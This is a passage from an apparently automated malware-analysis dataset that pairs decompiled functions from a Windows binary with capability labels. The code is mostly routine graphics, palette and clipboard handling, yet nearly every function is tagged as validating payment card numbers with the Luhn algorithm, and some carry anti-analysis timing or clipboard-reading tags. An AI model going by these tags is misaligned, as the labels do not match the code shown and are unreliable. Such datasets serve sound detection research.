        "decompiled_code": "\nvoid fcn.00423cc4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x423cdb;\n    iVar1 = fcn.00419bf8();\n    uStack28 = 0x423d61;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.00419888();\n        fcn.00425350();\n        var_4h = var_4h + 1;\n        fcn.004256b8();\n    }\n    fcn.00423c54();\n    fcn.00423c54();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423d68;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x423d4d;\n            fcn.00419888();\n            uStack28 = 0x423d52;\n            fcn.00425588();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x423d60;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 349
    },
    "004244a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004244a8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    *0x48fb88 = 0;\n    uVar1 = fcn.004239b4();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x497a04;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "00424540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424540(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x42455b;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x42456b;\n        fcn.004241f4();\n        uStack24 = 0x4245fb;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424583;\n        puStack20 = &stack0xfffffffc;\n        fcn.004241f4();\n        uStack36 = 0x4245de;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423bd8();\n        fcn.0042467c();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.004249c0();\n            fcn.004249dc();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x4245e5;\n        uStack36 = 0x4245dd;\n        fcn.00424204();\n        return;\n    }\n    puStack20 = 0x42460d;\n    fcn.00419e30();\n    return;\n}\n",
        "token_count": 401
    },
    "004248f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004248f8(void)\n\n{\n    fcn.004243e8();\n    fcn.0042462c();\n    return;\n}\n",
        "token_count": 34
    },
    "00424924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424924(void)\n\n{\n    fcn.00424614();\n    fcn.0042462c();\n    return;\n}\n",
        "token_count": 32
    },
    "00424a08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424a08(uint param_1, uchar param_2)\n\n{\n    fcn.00424614(param_2);\n    fcn.0042462c();\n    return;\n}\n",
        "token_count": 46
    },
    "00424ac4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424ac4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004239b4();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "00424b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424b30(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424b4b;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424b5b;\n        fcn.004241f4();\n        uStack24 = 0x424bd0;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424b73;\n        puStack20 = &stack0xfffffffc;\n        fcn.004241f4();\n        uStack36 = 0x424bb3;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423bd8();\n        fcn.00424d18();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424bba;\n        uStack36 = 0x424bb2;\n        fcn.00424204();\n        return;\n    }\n    puStack20 = 0x424be2;\n    fcn.00419e30();\n    return;\n}\n",
        "token_count": 339
    },
    "00424c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424c58(void)\n\n{\n    fcn.00424be8();\n    fcn.00424c00();\n    return;\n}\n",
        "token_count": 34
    },
    "00424d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424d90(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004239b4();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 159
    },
    "00424df8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424df8(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424e13;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424e1f;\n        fcn.004241f4();\n        uStack24 = 0x424e88;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424e37;\n        puStack20 = &stack0xfffffffc;\n        fcn.004241f4();\n        uStack36 = 0x424e6b;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423bd8();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424e72;\n        uStack36 = 0x424e6a;\n        fcn.00424204();\n        return;\n    }\n    puStack20 = 0x424e9a;\n    fcn.00419e30();\n    return;\n}\n",
        "token_count": 332
    },
    "00424f0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424f0c(uint param_1, uint param_2)\n\n{\n    fcn.00424ebc(*0x48fe10, *0x48fe14, param_2, *0x48fe1c);\n    return;\n}\n",
        "token_count": 61
    },
    "00425088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425088(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.004244a8();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4258e8;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424ac4();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425908;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424d90();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425928;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x425148;\n    fcn.00419b70();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 420
    },
    "00425230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425230(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.00425770();\n            fcn.00424f30();\n            uVar2 = fcn.004241b0();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.004241b0();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00418438(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "004254f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004254f0(void)\n\n{\n    ulong uStack16;\n    \n    fcn.004254a8();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "0042550c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0042550c(void)\n\n{\n    uint uStack12;\n    \n    fcn.004254a8();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 41
    },
    "00425600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425600(uint param_1, uint *param_2)\n\n{\n    fcn.00425378(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 44
    },
    "0042571c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042571c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.004256b8();\n            fcn.004255d8();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00425600();\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "004259f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004259f0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x425a8c;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.004057a0();\n            fcn.0040daec();\n            fcn.00404ec4();\n            goto code_r0x00425a73;\n        }\n    }\n    fcn.0042599c();\ncode_r0x00425a73:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.00405530(0x425a93);\n    return;\n}\n",
        "token_count": 294
    },
    "00425c28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425c28(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 72
    },
    "00425f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425f10(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00403af4();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00425fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00425fe0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x42600c;\n    fcn.004030fc();\n    uStack1044 = 0;\n    puStack1048 = 0x426013;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x4260dd;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.00425fe0::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.00425fe0::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.00425fe0::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x4260e4);\n    return;\n}\n",
        "token_count": 478
    },
    "00426454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00426454(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 387
    },
    "004267f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.004267f0(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "004268ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004268ec(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00426808();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 233
    },
    "00426c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00426c34(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "00426cdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426cdc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.00426c84(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 101
    },
    "00427090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427090(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    fcn.0042713c();\n    fcn.0042713c();\n    fcn.0042713c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0042713c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042713c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x427157;\n    fcn.00419730();\n    uStack32 = 0x427180;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00419730();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 138
    },
    "00427390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427390(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4273ac;\n    iVar1 = fcn.004271a4();\n    if (iVar1 == 0) {\n        puStack28 = 0x4273bc;\n        fcn.00425960();\n    }\n    puStack28 = 0x4273c3;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStack32 = 0x427407;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piVar2[7] = in_EAX;\n    puStack28 = &stack0xfffffffc;\n    iVar1 = fcn.00404864();\n    piVar2[6] = iVar1;\n    (**(*piVar2 + 0x5c))();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x427426;\n    fcn.00404650();\n    *(in_EAX + 0xc) = piVar2;\n    piVar2[5] = in_EAX;\n    uStack32 = 0x42743a;\n    iVar1 = fcn.00404864();\n    piVar2[4] = iVar1;\n    uStack32 = 0x42744a;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 375
    },
    "0042775c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042775c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x427688;\n    fcn.004276e0(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 89
    },
    "00427bc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427bc8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x427bdc;\n    fcn.00427b34();\n    puStack124 = 0x427beb;\n    fcn.0041b930();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x427bf9;\n        fcn.00425990();\n    }\n    puStack124 = 0x427c01;\n    uVar2 = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x427c88;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.0041b930();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.00425990();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x427c8f;\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 471
    },
    "00427e18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427e18(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x427ec1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x427e9f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0040a6b4();\n    fcn.0040e8f4();\n    fcn.00405974();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.00426f0c();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 307
    },
    "00428398": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00428398(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.00425960();\n    }\n    fcn.00427b34();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 320
    },
    "004286c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004286c0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00425088();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00428980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
